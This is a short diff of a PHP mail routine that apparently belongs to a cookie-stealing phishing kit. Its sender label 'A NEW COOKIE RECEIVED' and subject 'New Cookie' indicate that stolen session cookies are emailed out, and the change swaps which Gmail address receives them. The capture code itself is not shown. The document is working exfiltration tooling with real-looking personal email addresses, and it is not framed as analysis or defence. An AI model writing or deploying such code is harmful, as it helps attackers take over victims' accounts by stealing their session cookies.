@@ -48,7 +48,7 @@ EOF;
   
   $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
   $mail->addAddress('kk442242@gmail.com', 'Receiver');
-  $mail->addAddress('facebookmonetizationlive@gmail.com', 'Receiver');
+  $mail->addAddress('raziqahmed23@gmail.com', 'Receiver');
   $mail->Subject = 'New Cookie';
   $mail->Body    = 'Hello,
 
